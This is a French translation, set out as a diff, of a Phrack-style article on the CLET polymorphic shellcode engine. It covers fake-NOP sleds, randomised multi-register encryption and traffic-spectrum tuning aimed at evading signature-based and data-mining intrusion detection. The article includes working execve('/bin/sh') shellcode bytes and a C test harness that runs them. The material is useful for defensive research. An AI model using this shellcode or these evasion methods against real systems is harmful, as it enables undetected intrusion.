@@ -1,0 +1,1495 @@
+|=--------[Polymorphic Shellcode Engine Using Spectrum Analysis]--------=|
+|=----------------------------------------------------------------------=|
+|=--------[ theo detristan theo@ringletwins.com ]--------=|
+|=--------[ tyll ulenspiegel tyllulenspiegel@altern.org ]--------=|
+|=--------[ yann_malcom yannmalcom@altern.org ]--------=|
+|=--------[ mynheer superbus von underduk msvu@ringletwins.com ]--------=|
+|=----------------------------------------------------------------------=|
+Traduit par ex0d, scoopex & jacob
+Pour Phrack-FR crou
+--[ 0 - Contents
+
+1 - Abstract
+
+2 - Introduction
+
+3 - Polymorphisme: principe et utilite'e contre les NIDS.
+
+4 - Rend le classique pattern matching inopperant.
+
+5 - Analyse du Spectrum pour contrer les me'thodes de data mining.
+
+6 - Le moteur CLET polymorphique
+
+7 - References
+
+
+--[ 1 - Abstract
+
+De nos jours, "polymorphique" est peut être un bien grand mot. Certains
+programmes appellés moteur de polymorphisme ont été tardivement developpés
+avec des routines de déchiffrement constante . Le polymorphisme est une
+méthode visant à lutter contre le pattern matching (cf 3.2) : si vous avez
+une suite consecutive d'octets constants dans le code que vous generez, les
+NIDS seront toujours capables de reconnaitre la signature de ces octets
+constants...
+
+Dans les quelques vrais moteurs existants (ceux qui generent des routines
+de déchiffrements non-constantes comme ADMmutate), il reste quelques
+faiblesses (toutefois, peut on vraiment appeler ca des faiblesses puisque
+les NIDS récents ne peuvent pas les utiliser ) comme le probleme du XOR (cf
+4.2) ou une zone de NOP avec seulement une instruction d'un octet (cf 4.1).
+Dans notre moteur, nous nous sommes interressés à  ces problemes, et nous
+avons essayé d'implementer quelques solutions. Nous avons aussi essayer d'
+implementer des méthodes contre la prochaine generation de NIDS qui
+utiliseront  les méthodes de data-mining.
+
+Par ailleurs, nous ne clamons pas avoir crée l'ultime moteur polyphormique
+. Nous sommes au courant de certaines faiblesses qui existent et nous
+exposerons un certains nombres de solutions pour pallier à ces faiblesses
+un peu plus bas, toutefois nous ne les avons pas encore implémentées.  De
+plus,Il y a probalement certaines faiblesses que nous n'avons pas remarqués
+: vos mails sont les bienvenues pour la prochaine version.
+
+Cet article explique notre travail, nos idées. Nous  esperons qu'il vous
+plaira.
+
+
+--[ 2 - Introduction
+
+Depuis le fameux "Smashing the stack for fun and profit", la technique du
+buffer overflow a été largement utilisée pour attaquer des systemes.
+
+Pour limiter la menace, de nouveaux systemes de defense sont apparus basés
+sur le pattern matching. A l'heure actuelle, les Intrusion Detection System
+(IDS) écoutent le traffic et essayent de detecter et de rejeter les paquets
+contenants des shellcodes utilisés dans les attaques de type buffer
+overflow.
+
+Dans la scene virus, une technique appellée polyphormisme apparu en 1992.
+L'idée derriere cette technique est vraiment simple, et cette idée peut
+etre appliquée aux shellcodes.  ADMmutate est la 1ere tentative publique
+d'utiliser le polymorphisme pour les shellcodes.
+
+Notre but était d'essayer d'améliorer cette technique, trouver des
+améliorations et les appliquer sur un moteur de shellcodes polymorphiques.
+
+
+--[ 3 - Polymorphisme: principes et utilité contre les NIDS.
+
+----[ 3.1 - Retour en 1992...
+
+En 1992, Dark Avenger a inventé une technique revolutionaire qu'il appella
+le polymorphisme. Qu'est ce que c'est ? cela consiste simplement à chiffrer
+le code du virus et à generer une routine de déchiffrement qui serait
+différente a chaque fois, donc  le virus est different a chaque fois et ne
+peut etre scanné par des méthodes de pattern matching. !
+
+Un bon moteur polymorphique apparut : Le TridenT Polymorphic Engine (TPE),
+Dark Angel Mutation Engine (DAME).
+
+En conséquence, les créateurs d'antivirus devellopèrent de nouvelles
+techniques comme l'analyse du spectrum, l'emulateurs de code , ...
+
+
+----[ 3.2 - Principes du polymorphisme
+
+Le polymorphisme est une méthode standard pour prevenir le
+pattern-matching. Pattern- matching signifie qu'un programme P (un
+antivirus ou un IDS) a une base de données avec des 'signatures'. Une
+signature est une suite d'octet identifiant un programme.  Concretement,
+prenons la partie de ce shellcode:
+
+push byte 0x68
+push dword 0x7361622f
+push dword 0x6e69622f
+mov ebx,esp
+
+xor edx,edx
+push edx
+push ebx
+mov ecx,esp
+push byte 11
+pop eax
+int 80h
+
+Cette partie fait un execve("/bin/bash",["/bin/bash",NULL],NULL).
+
+Elle ressemble a ceci une fois coder :
+"\x6A\x68\x68\x2F\x62\x61\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2"
+"\x52\x53\x89\xE1\x6A\x0B\x58\xCD\x80".
+
+Si vous trouvez cette chaine de caractères dans un paquet destiné à un
+serveur web , ceci peut etre une attaque. Un IDS va refuser ce paquet.
+Evidement, il y a d'autres méthodes pour réaliser un execve , cependant,
+cela va créer une autre signature. C'est ce qu'on appelle le pattern
+matching.  Parler des virus ou des shellcodes n'est pas important, le
+principe est le meme.  Nous allons voir plus tard les spécificitées des
+shellcodes.
+
+Imaginez maintenant que nous avons un code nommé C, qu'un programme P
+recherche. Votre code est toujours le meme, c'est normal, mais c'est une
+faiblesse. P peut avoir un exemple caractéristique de C, une signature de
+C, et faire du pattern matching pour detecter C. Et donc, C n'est pas
+utilisable quand P est lancé.
+
+La 1ere idée est de chiffrer C. Imaginez C comme ceci :
+
+[CCCCCCC]
+
+Puis vous chiffrez le tout :
+
+[KKKKKKKK]
+
+Mais si vous voulez utiliser C, vous devez mettre une routine pour
+dechiffrer au début du code :
+
+[DDDDKKKKKKKK]
+
+Cool ! On a chiffré C et l'exemple de C que P possède n'est plus efficace.
+Mais vous avez introduit une nouvelle faiblesse car la routine de
+dechiffrement sera la meme (exceptée la clé) à  chaque fois, et P sera
+capable d'avoir un extrait de la routine dechiffrée.
+
+Au final, vous avez chiffré C mais C est  encore détectable.
+
+Et le polymorphisme est né !
+
+L'idée est de generer une routine de dechiffrement différente à chaque
+fois.  "Different" veut vraiment dire different : il n'y a pas que la clé
+qui change. Vous pouvez le faire avec différentes méthodes : 
+- generer une routine de dechiffrement avec des opérations différentes de
+  déchiffrement à chaque fois. Une routine classique de
+chiffrement/dechiffrement utilise un XOR mais vous pouvez utiliser
+n'importe quelle opération du moment qu'elle est reversible : ADD/SUB,
+ROL/ROR, ...
+- generer un faux code au milieu de la  vraie routine de dechiffrement. Par
+  exemple, si vous n'utilisez pas certains registres, vous pouvez jouer
+avec, faire de fausses operations au milieu du code de déchiffrement.
+- utiliser ces deux techniques :)
+
+Donc un moteur de polymorphisme réalise deux opérations  en meme temps :
+- il chiffre le corps du shellcode.
+- il genere une routine de dechiffrement qui est _differente_ a chaque
+  fois.
+
+
+----[ 3.3 - Polymorphisme versus NIDS.
+
+Un code d'UN BUFFER OVERFLOW A 3 OU 4 PARTIES :
+------------------------------------------------------------------------------
+| NOP | shellcode | bytes to cram | adresse de retour |
+------------------------------------------------------------------------------
+
+De nos jours, les NIDS essayent de trouver une suite de NOPs consecutifs
+et font du pattern matching sur les shellcodes quand ils croient avoir
+detectés une zone de faux NOPs.  Ce n'est pas vraiment une méthode
+efficace. D'autre part, on peut imaginer des methodes pour reconnaitre la
+partie des octets qui "bourrent" the buffer ou les nombreuses adresses de
+retour consécutives.  Donc, notre moteur polymorphique doit trouver une
+parade  pour  chacun de ces points afin de  rendre nos shellcodes
+méconnaissables. Voici ce qu'on a essayer de faire :
+
+- premierement, la série de NOPs est changée en une serie d'instructions
+  aléatoires (cf 4.1 "fake-nop") codées sur   1,2 ou 3  octets..
+
+- deuxiemement, le shellcode est chiffré (avec une methode aléatoire
+  utilisant plus qu'un XOR) et la routine de déchiffrement est générée
+aléatoirement.  (cf 4.2)
+
+- troisiemement, dans un shellcode polymorphique , on doit eviter d'avoir
+  une grosse zone d'adresse de retour. En effet, une grosse zone peut être
+détéctée, particulierement par les méthodes de data-mining.  Pour eviter
+cette detection, l'idée est d'essayer de limiter la taille de la zone
+adresse et d'ajouter les octets que nous choisissons, entre le shellcode et
+cette zone. Ces octets sont choisis aléatoirement ou par utilisation de
+l'analyse spectrum (cf 5.3.A)
+
+- finallement, nous n'avons pas trouver une meilleure méthode que ADMmutate
+  pour couvrir les addresses de retour: parce que l'adresse de retour est
+choisie sans certitude, ADMutate change les bits de poids faible  de
+l'adresse de retour entre les différentes occurences (cf 4.2).
+
+NB: Les shellcodes ne sont pas exactement comme les virus et nous pouvons
+tirer avantage des points suivants:
+- Un virus doit être parfait pour que la machine infectée marche toujours
+  après l'infection ; Un shellcode ne doit pas etre parfait! Nous savons
+que le shellcode va être la derniere chose à être executer, ainsi nous
+pouvons faire ce que nous voulons avec des registres, pas besoin de les
+sauver.  Nous pouvons tirer de bons avantages de ca : nous pouvons par
+exemple éviter d'utiliser des fonctions qui ne font rien dans notre zone de
+faux NOPS  (comme INCR & DECR, ADD & SUB ou PUSH & POP...) (ce qui serait
+plus facile à reconnaitre pour les IDS faisant de l'emulation du code).
+Notre fake-nop est une instruction aléatoire sur un octet, et nous
+décrirons une autre methode (non implementée pour le moment) pour ameliorer
+ceci car generer seulement des instructions sur un octet est une faiblesse.
+
+- La méthode de chiffrement aléatoire peut avoir plusieurs formes avec du
+  code aléatoire (pas nécessairement une instruction sur un octet) qui fait
+n'importe quoi, mais sans conséquence sur le déchiffrement (hum...  pas
+encore implémentée).
+- Un shellcode ne doit pas contenir de zéros, puisque nous utiliserons
+  uniquement des chaines de caractères  pour stocker notre code.  Nous
+devons faire attention à ce point.
+
+
+Voici a quoi ressemble un shellcode polymorphe:
+-----------------------------------------------------------------------------
+| FAKENOP | Routine chiffrée | shellcode | bytes to cram | adresse de
+retour |
+-----------------------------------------------------------------------------
+
+Etudions en maintenant chaque partie:
+
+
+--[ 4 - Rendre les modèles classique d'IDS inefficace.
+
+----[ 4.1 - Fake NOPs zone avec des instructions sur 2 ou 3 octets.
+
+------[ 4.1.A - Principes
+
+Les NOPs sont necessaires avant le shellcode lui meme. Mais pourquoi est-ce
+necessaire? Parce que nous ne savons pas exactement ou nous sautons, nous
+savons juste que nous sautons au milieu des  NOPs (cf article de Aleph One
+[1]). Mais ce n'est pas nécessaire d'avoir un NOPs, nous pouvons utiliser
+une instruction non-dangereuse. Nous n'avons pas a sauvegarder les
+registres, la seule condition que nous avons est d'arriver jusqu'a la
+routine de dechiffrement sans erreurs. Cependant nous ne pouvons pas
+utiliser n'importe quelle instruction "non-dangereuse". Rappelez-vous, nous
+ne savons pas exactement ou nous sautons.
+
+Une methode pour regler ce probleme est d'utiliser une instruction codé sur
+un octet.  En effet, dans ce cas, partout ou nous sautons, nous tomberons
+sur une instruction correct. Le probleme d'un tel choix  est qu'il n'existe
+pas beaucoup d'instructionstruct sur un octet. Il est ainsi relativement
+facile pour un IDS de detecter la zone de NOPs. Heuresement, beaucoup
+d'instructions sur un octet peuvent être codées avec une lettre majuscule,
+et ainsi on peut cacher la zone de NOPs dans une zone alpha-numerique
+utilisant le dictionnaire americain-anglais (option -a de CLET). Cependant,
+comme nous expliquons au point 5, un tel choix peut etre inefficace surtout
+quand le service demandé n'est pas un 'service alpha-numerique' (cf 5).
+
+Ainsi le problème est le suivant: Comment pouvons nous generer un fake-nop
+utilisant une instruction multi-octet pour mieux cacher notre fake-nop?
+
+
+On peut utiliser l'idée simple suivante : nous pouvons genere une
+instruction sur deux octet, le second octet de celle ci etant  une
+instruction un-octet ou le premier octet d'une instruction tenant sur deux
+octets, et on continue de manière recursive.  Mais voyons les désavantages
+d'une telle méthode.
+
+------[ 4.1.B - Instructions a plusieurs bytes non-dangereuses
+
+- Les instructions utilisant plusieurs octets peuvent être dangereuses
+  parce qu'elles peuvent modifier la pile ou les sélecteurs de segment
+(etc.....) avec des effets aléatoires.  Ainsi nous avons a choisir des
+instructions innofensives ( pour ceci, le livre  [3] est notre ami... mais
+nous allons devoir faire de nombreux tests  sur les instructions que nous
+avons choisi).
+
+- Quelques fois, les instructions multi-octets demandent un prefixe
+  particulier pour specifier un registre ou une manière d'utiliser cette
+instruction (voir modR/M [3]). Par exemple, l'instruction CMP rm32,imm32
+(comparer) avec un tel code "0x81 /7 id"  est une instruction 6-octets qui
+demande un suffix pour specifier le registre a utiliser, et ce registre
+doit appartenir a la 7eme colone de "32-bit adressing Forms with the modR/M
+Byte" (cf[3]). Cependant, souvenez vous que quelquesoit l'endroit ou le
+pointeur pointe dans le fake-nop, il doit pouvoir lire un code valide.
+Ainsi le suffixe et les arguments de l'instruction doivent etre des
+instructions eux-memes.
+
+------[ 4.1.C - Un cas facile
+
+Maintenant prenons cette chaine : \x15\x11\xF8\xFA\x81\xF9\x27\x2F\x90\x9E
+Si nous prenons  ce code depuis le début, nous lisons:
+
+ADC $0x11F8FA81 #instruction demandant un argument de 4-byte
+STC #one-byte instructions
+DAA
+DAS
+NOP
+SAHF
+
+Si nous commencons au second octet, nous lisons:
+ADC %eax,%edx
+CMP %ecx,$0x272F909E
+
+Etc... Nous pouvons commencer de n'importe ou et lire un code valide qui
+ne fait rien de dangereux...
+
+------[ 4.1.D Testez le fake-nop
+
+char shell[] =
+"\x99\x13\xF6\xF6\xF8" //notre fake_nop
+"\x21\xF8\xF5\xAE"
+"\x98\x99\x3A\xF8"
+"\xF6\xF8"
+"\x3C\x37\xAF\x9E"
+"\xF9\x3A\xFC"
+"\x9F\x99\xAF\x2F"
+"\xF7\xF8\xF9\xAE"
+"\x3C\x81\xF8\xF9"
+"\x10\xF5\xF5\xF8"
+"\x3D\x13\xF9"
+"\x22\xFD\xF9\xAF"
+//shellcode
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+int main()
+{
+void (*go)()=(void *) shell;
+go();
+return(0);
+}
+
+Nous testons une chaine fake_nop generée avec notre code... mais vous
+pouvez voir qu'il n'est pas vraiment efficace : quand l'adresse (shell+i)
+de la fonction go() est changée, le programme de test quitte avec:
+
+shell -> sh-2.05b$
+shell+1 -> sh-2.05b$
+shell+2 -> Floating point exception Argh!
+shell+3 -> sh-2.05b$
+shell+4 -> sh-2.05b$
+...
+shell+11 -> sh-2.05b$
+
+Nous n'avons pas assez été soigneux avec le choix et l'organisation de nos
+instruction pour le fake_nop :  il en resulte des segfaults aleatoires ou
+des exceptions de virgule flotante...  (Vraiment chiant)
+
+
+------[ 4.2 - La routine de dechiffrement
+
+Il y'a deux manières diffèrentes pour génerer une routine de déchiffrement:
+- vous pouvez toujours utilisez la même routine mais modifier les
+  instructions.  Par exemple vous pouvez utiliser add eax,2 ou inc eax; inc
+eax; le résultat sera le même mais pas le code.
+- vous pouvez génerer une routine de déchiffrement différente.
+
+Dans cette deuxième méthode, vous pouvez ajoutez du code entre les
+instruction de la routine de déchiffrement. Evidemment, cet ajout de code
+ne doit pas modifier le fonctionnement de cette routine.
+
+CLET a choisi la seconde approche, mais  nous ne génererons pas de code
+entre les instructions parce que nous utilisons des registres, un  ordre
+des instructions, des types d'instructions (ADD,SUB,ROL,ROR,XOR) qui
+changent à  chaque fois. Ce n'est donc pas  nécessaire d'ajouter des
+instructions.
+
+* XOR with a fixed size key is not enough
+
+Utiliser  une routine avec XOR seulement et une clé de taille fixée
+introduit une faiblesse dans le cryptage. Mark Ludwig decrit cela dans
+"From virus to antivirus" avec un exemple concret. Cette faiblesse  vient
+de l'associativité et la commutativité de l'operation XOR couplée avec la
+taille constante de la clé.
+
+Imaginez que vous cryptez les deux octets B1 B2 avec la clé K, vous obtenez
+deux octets  chiffrés C1 C2.
+
+C1 XOR C2 = (B1 XOR K) XOR (B2 XOR K)
+= B1 XOR K XOR B2 XOR K
+= B1 XOR B2 XOR K XOR K
+= B1 XOR B2 XOR (K XOR K)
+= B1 XOR B2 XOR 0
+= B1 XOR B2
+= Constante (independante de K)
+
+Nous savons maintenant pourquoi un shellcode crypté avec une routine XOR et
+une clé de taille fixée laisse une signature caractéristique du shellcode.
+Dans le cas ou vous avez une clé de N octets, pour obtenir la signature,
+vous devez appliquer un XOR des octets  k avec les octets  k+N. Une telle
+signature pourrait être exploitée par les NIDS ( meme si cela demande une
+forte puissance de calcul).
+
+C'est important de noter (Merci a ceux qui nous l'ont dit ) que le problème
+ne provient pas du  XOR en lui-même mais de l'utilisation de XOR avec   une
+clé de taille fixée. En effet, quelques moteurs polymorphes comme vx,
+utilisent seulement XOR dans le chiffrage mais la clef n'est pas la même
+tout le long du chiffrage.  La clé change, et sa taille aussi. Dans ce cas,
+notre démonstration est inefficace parce que B1 et B2 ne sont pas crypté
+avec la même clé K et vous ne savez pas ou est le byte suivant crypté avec
+la meme clé (ce que vous savez(connaissez) quand vous utilisez un chiffrage
+avec un seul XOR et une clef de taille fixée de plusieurs octets.)
+
+
+Ainsi une routine de chiffrement  utilisant seulement un XOR et une taille
+de clé fixée n'est pas suffisant.  Dans CLET nous générons des routines
+chiffrées avec des instructions XOR, ADD, ROR, ...
+
+
+
+* Registres aléatoires
+
+Rappelez vous que nous avons décidé de générer une routine différente a
+chaque fois.  Meme si nous changons le type de chiffrement a chaque fois,
+il est également important de modifier les instructions assembleurs qui
+constituent la routine chiffrée. Pour cela, nous avons décidé de changer
+les registres utilisés. Nous avons besoin de trois registres, un pour
+enregistrer l'adresse ou nous travaillons, un autre pour enregistrer
+l'octet sur lequel nous travaillons, et enfin un troisieme pour enregistrer
+toutes les autres choses. Nous avons le choix entre eax,ebx,ecx,edx.  Nous
+allons donc utiliser aléatoirement trois registres à chaque fois.
+
+
+* Encryptation sur  quatres octets pour vaincre les méthodes d'analyse
+ spectralee.
+
+Commencons par  expliquer ce que nous appellons un spectre et ce qu'est
+une analyse du spectre.
+
+Le spectre d'un paquet vous donne les octets et le nombre d'octets dans ce
+paquet
+
+Pour l'instant, le tableau suivant est le spectre d'un paquet appellé X:
+
+
+|\x00|\x01|\x08|\x0B|\x12|\x1A| ... |\xFE|\xFF|
+-----------------------------------------------
+| 25 | 32 | 04 | 18 | 56 | 43 | ... | 67 | 99 |
+
+Ce tableau signifie qu'il y a 25 \x00 dans X, 32 \x01, 0 \x02, ...  Ce
+tableau est ce que nous appellons le spectre de X
+
+Une méthode d'analyse spectrale produit le spectre d'un paquet et crée la
+"règle merci" de ces spectres. Beaucoup d'IDS utilise la méthode d'analyse
+spectrale pour écarter certains paquets.  Pour l'instant, imaginez que dans
+un traffic normal, vous n'avez jamais de paquet avec plus de 20 octets de
+\xFF. Vous pouvez creer la regle suivante: Ecarter les paquets avec plus de
+20 octets de \xFF. Ceci est une regle simple de l'analyse spectrale, en fait
+beaucoup de regles sont générées (avec l'approche neuronal pour l'instant,
+voir 5.2) en tenant compte du spectre des paquets. Ces règles autorisent un
+IDS à écarter des paquets en fonction de leur spectres. C'est ce que nous
+appellons une méthode d'analyse spectrale.
+
+Maintenant voyons comment un IDS peut combiner le pattern matching et les
+méthode d'analyse spectrale.
+
+L'idée est d'enregistrer des signatures, mais pas les signatures d'octets
+consecutives mais plutot les signature du spectre. Pour l'instant, pour le
+précédent paquet X, nous enregistrons: 25, 32, 04, 18, 56, 43, ...., 67,
+99. Pourquoi ces valeurs ? parce que si vous utilisez une encryptation d'un
+octet seul, ces valeurs seront toujours les memes.
+
+Dans cette optique, si nous chiffrons un paquet X avec la routine chiffré
+XOR 02, ADD1 nous obtiendrons un paquet X' dont le spectre est:
+
+
+|\x03|\x04|\x0A|\x0B|\x11|\x19| ... |\xFD|\xFE|
+-----------------------------------------------
+| 25 | 32 | 18 | 04 | 56 | 43 | ... | 67 | 99 |
+
+
+
+Le spectre est différent, les valeurs aussi; cependant nous avons les memes
+valeurs mais attribuées à des  octets différents. La signature est la meme.
+Avec une tel encryptation, le spectre des occurences de chaque octet
+encryptré est une permutation du spectrue des octets non encryptés.
+L'encryptation d'un octet seul retourne une valeur qui est unique, et
+"caractéristique de cet octet ": cela pose un vrai probleme.
+
+Afin d'éviter les similarités des signatures, le shellcode est encryptés
+sur quatres octets :  cette méthode nos permet d'eviter d'avoir un spectre
+singulier des occurences. en effet, si nous cryptons ffffffff par exemple
+avec xor aabbccdd, add 1, nous obtiendrons 66554433.  ainsi, le spectre de
+x' n'est pas une permutation du spectre de x. une encryptation sur quatre
+octets nous permet donc d'éviter cette sorte d'analyse spectrale.
+
+mais les méthodes d'analyse spectrale ne sont qu'un cas particulier d'une
+méthode plus générale  appellée méthodes de data-mining.  nous allons voir
+ce que sont ces méthodes et comment pouvons nous utiliser l'analyse
+spectrale du traffic pour essayer de vaincre ce genre de méthodes plus
+général.
+
+--[ 5 - l'analyse spectrum pour vaincre les méthodes de data-mining
+
+----[ 5.1 - historique
+
+Lorsque  vxvers a découvert le polymorphisme, les créateurs d'antivirus
+craignaient que cela soit la solution ultime, et que le matching pattern
+serait inefficace.  Pour lutter contre ce nouveaux type de virus, ils
+déciderent de modifier leurs attaques (du problème).  Les antivirus avec
+analyse heuristique étaient alors nés. Ce type d'antivirus tente ,par
+exemple, d'éxecuter le code en mémoire et  teste si le code modifie ses
+propres instructions.  (si il essaye de les chiffrer, dans l'exemple) dans
+un tel cas, il se peut que se soit un virus polymorphique.  Comme nous
+l'avons vu plus haut, l'encryptation 4-octets, qui  n'utilise pas seulement
+un xor et une taille de clé fixée et une  zone fakenop avec des
+instructions de plus d'un octet permet de 'vaincre" le pattern matching.
+Peut etre reste-t-il quelques faiblesses ?  Cependant nous pensons que les
+moteurs polymorphique vont être de plus en plus efficaces, et que
+finalement il sera assez difficile d'imple'menter des méthodes efficaces
+de pattern matching dans les ids.  Les ids vont-ils prendre exemple sur les
+antivirus, et essayer d'implémenter une méthode heuristique ? Nous ne le
+pensons pas, parce qu'il y a de grosses différences entre les ids et les
+antivirus, les ids doivent travailler en temps réel. Ils ne peuvent pas
+logué tous les paquets et les analyser ensuite. Il est donc probable que
+l'approche heuristique ne sera jamais utilisée pour détecter les shellcodes
+polymorphismes .En outre, l'ids snort, qui essaye de devellopper des
+méthodes de détection des shellcodes polymorphiques, n'utilise pas de
+méthodes heuristiques mais des méthodes de data mining. C'est probablement
+ce genre de  méthodes qui vont être developpées.  nous allons donc essayer
+de créer des shellcodes polymorphique qui permettent d'eviter une telle
+méthode de détection ( comme nous le verrons dans la partie 5.3). Mais nous
+allons commencer par vous  donner une rapide explication concernant les
+meéthodes de data mining.
+
+----[ 5.2 un exemple d'une méthode de data mining, l'approche neuronale, ou
+l'utilisation d'un perceptron pour identifier le shellcode polymorphique
+
+Comme nous l'avons expliqué précedemment, nous voulons que, d'un ensemble
+de critères détectés par un certain nombre de sondes réseaux, un manager
+prenne une décision fiable en temp réel sur le traffic réseau. Avec le
+developpement des moteurs polymorphiques, peut être que le pattern matching
+deviendra inefficace ou trop difficile a` implémenter du fait que vous
+devez créer un grand nombre de règles, que peut être vous ne connaitrez
+pas.  Y a t'il une solution ? Nous avons un grand nombre d'informations et
+nous souhaitons les traiter rapidement pour pouvoir prendre une decision,ce
+qui est généralement le but de ce qui est appellé les méthodes de data
+mining.
+
+En fait, le but de data mining est le suivant:
+
+D'un grand ensemble de variables explicites (x1,..,xn) nous cherchons a
+prendre une décision sur une variable y inconnue. Notez que:
+
+* cette decision doit être prise rapidement (problème de la  complexité du
+ calcul)
+* cette décision doit être fiable (problème des réponses faussées ...)
+
+Il y a un bon nombre de méthodes qui sont liées à  la théorie du data
+mining.  Pour faire comprendre l'approche CLET à propos des méthodes
+anti-data mining, nous avons décider de présenter l'une d'entre elles: la
+méthode connexioniste. Nous avons choisi cette méthode car elle a plusieurs
+qualités pour la détection d'intrusions:
+
+* la reconnaissance d'intrusion est basée sur l'apprentissage. par exemple,
+  avec un seul neurone, l'étude consiste a choisir les meilleurs variables
+explicatives x1,...,xn et à configurer les meilleurs valeurs pour les
+parametres w1,...wn (voir ci-dessous)
+* grace a cette apprentissage, un réseau de neurones  est tres flexible et
+est capable de travailler avec un important nombre de variables, et avec
+une explicitation de y en utilisant les variables x1,...,xn ().
+
+Ainsi, dans un réseau, une telle approche semble être intéressante, puisque
+le nombre de variables explicites est certainement énorme. Expliquons les
+bases de cette méthode.
+
+
+------[ 5.2.a - modelisation d'un neuron
+
+Pour comprendre le fonctionnement d'un ids utilisant une  méthode de
+data-mining basée sur l'approche neuronale, nous devons comprendre comment
+fonctionne un neurone (appellée ainsi parce que ce genre de programmes
+copie  le neurone de votre cerveau). Le schéma ci-dessous explique comment
+fonctionne un neurone.  Comme dans votre cerveau, un neurone est une simple
+calculatrice.
+
+                      ____________
+X1 --------w1--------|            | 
+                     |            |
+X2---------w2--------|            |
+                     |   Neuron   |--fh[(w1*X1 + w2*X2 + ... + wN*XN)-B]
+...                  |            |
+                     |            |
+XN --------wN--------|____________|
+
+
+fh est la fonction définie par: |
+fh(x)=1 si x>0 			| b est appellé l'offset du neurone.
+fh(x)=0 si x<=0 		|
+
+Ainsi nous comprenons que la valeur de sortie est 0 ou 1 et que cette
+valeur dépend des entrées x1,x2,...,xn et des variables  w1,w2,...,wn.
+
+------[ 5.2.b - Une méthode de data-mining: utilisation de l'approche
+neuronale dans un ids.
+
+Imaginez maintenant que la valeur x1,x2,...,xn sont les valeurs des données
+d'un paquet:x1 est le premier octet, x2 le second,..., xn est le dernier
+(vous pouvez choisir le premier bit x1, le second x2, etc... si vous voulez
+que les valeurs entrées soit 0 ou 1) (nous pouvons également choisir x1 le
+nombre de \x00,x2  le nombre de \x01,...). Il y a plusieurs méthodes, nous
+exposons une idée ici dans le but d'expliquer le data mining). La question
+est la suivante: quels w1,w2,...wn devons nous choisir pour générer une
+valeur de sortie de 1 si la paquet est un paquet 'dangereux' et 0 si c'est
+paquet normal ? Nous ne pouvons pas trouver de valeur, nos neurones vont
+devoir l'apprendre avec l'algorithme suivant:
+
+w1,w2,...,wn sont d'abord choisis aléatoirement.
+Ensuite, nous créons quelques paquets, dont certains 'dangereux' avec le
+moteur polymorphique, et nous les testons avec le neurone.
+Nous modifions le wi lorce que la valeur sortie est fausse.
+
+Si la valeur de sortie est 0 au lieu de 1:
+wi <- wi + z*xi 0<=i<=n
+Si la valeur de sortie est 1 au lieu de 0:
+wi <- wi - z*xi 0<=i<=n
+
+z est une valeur constante choisie arbitrairement.
+
+Lors des étapes faciles, le neurone va 'apprendre' à différencier les
+paquets 'dangereux' de ceux qui sont 'normaux'. Dans un ids reel, un
+neurone n'est pas suffisant, et la convergence doit être étudiée. Il y a
+deux gros avantages de l'approche neuronale:
+
+* les décisions d'un réseau neuronal ne dépendent pas directement des
+règles écrites par l'homme, elles sont basées sur l'apprentissage qui va
+fixer le poids des différentes entrées des neurones en utilisant la
+minimisation de critères statistiques particuliers. Ainsi, les décisions
+sont plus judicieuses et plus adaptées au traffic réseau local que les
+régles générales.
+* lorsquee que le champ de recherche est important (des bases de données
+ énormes  pour le pattern matching), l'approche data-mining est plus rapide
+parce que l'algorithme n'a pas à chercher dans une énorme base de données
+et n'a pas a executer un grand nombre de calculs (lorsque que le choix de
+la topologie réseaux, des variables explicites et l'apprentissage sont
+"bon"...)
+
+
+----[ 5.3 - L'analyse spectrale dans CLET contre la méthode data-mining.
+
+La principale idée de la méthode exposée précedemment, comme beaucoup de
+méthodes de data mining, est d'apprendre a reconnaitre un paquet normal
+d'un paquet'dangereux'. Ainsi, nous comprenons que pour lutter contre ce
+type de méthodes, un simple polymorphisme n'est pas suffisant, et la
+méthode alphanumerique (vive l'excellent article de rix), peut être
+inefficace. En effet, dans un cas d'une communication non-alphanumerique,
+les données alphanumeriques seront considerées étranges et vont créer une
+alerte.  La question est de savoir comment un moteur polymorphique peut
+générer un shellcode polymorphique qui sera considéré comme normal par un
+ids utilisant les méthodes data mining. Peut etre que le moteur CLET
+montre-t-il un commencement de réponse? Cependant, nous sommes au courant
+de certaines faiblesses (pour l'instant le spectrumfile n'as pas
+d'influence sur la zone fakenot(fake-nop probablement)), nous travaillons
+actuellement sur ces faiblesses.  Voyons comment cela fonctionne.
+
+Imaginez le cas suivant:
+
+                              _________  
+                             | Firewall|       ________
+               ---Internet---|    +    |------| Server |
+                             |   IDS   |      |________|
+                             |_________| 
+
+Nous pouvons supposé que les ids analysent les paquets entrants avec un
+port de destination 80 et l'ip du serveur avec les méthodes de data-mining.
+Pour échapper à ce controle, notre idée est de générer  des octets dont les
+valeurs dépendent de la probabilité de cette valeur dans un traffic normal.
+
+theo@warmach# sniff eth0 80 2>fingerprint &
+theo@warmach$ lynx server.com
+
+Le sniffer va écouter sur l'interface eth0 les paquets sortants avec un
+port de destination égal à 80, et enregistrera les données dans un fichier
+fingerprint en binaire.  Ensuite, nous commencons à naviguer normallement
+pour enregistrer un traffic 'normal'.
+
+theo@warmach$ stat fingerprint spectralefile
+
+Le programme stat va geénérer un fichier spectralefile dont le contenu a le
+format suivant:
+
+0 (nombre d'octets \x00 in leaving data destinated to server)
+1 (nombre d'octets \x01 in leaving data destinated to server)
+...
+ff (nombre d'octets \xff in leaving data destinated to server)
+
+Ce spectralefile peut être généré par plusieur méthodes. On peut utiliser
+la méthode utilisée dans  mon exemple, ou décider de le générer via le
+traffic sur un réseau, ou encore décider de l'écrire si vous des attentes
+spéciales ....
+
+Maintenant, interrogeons nous sur la manière d'utiliser ce fichier.
+Comment pouvons nous utiliser une description d'un traffic ? L'option f de
+CLET nous permet d'utiliser une analyse d'un réseau grâce à ce fichier
+spectrale.
+
+theo@warmach$ CLET -n 100 -c -b 100 -f spectralefile -b
+(cf 6 for options)
+
+L'action de l'option -f différe selon les différente zones du shellcode
+(nopzone, routine déchiffrée, shellcode, cramming zone). En effet, nous
+voulons modifier, grace au spectralefile, le processus de génération du
+shellcode prolymorphique, mais nous ne pouvons pas réaliser  la meme action
+sur chaque zone car les contraines selon les  zones. Il est par exemple,
+dans certains cas, très difficile de générer une zone de faux-nops en
+s'appuyant sur l'analyse spectrale.
+
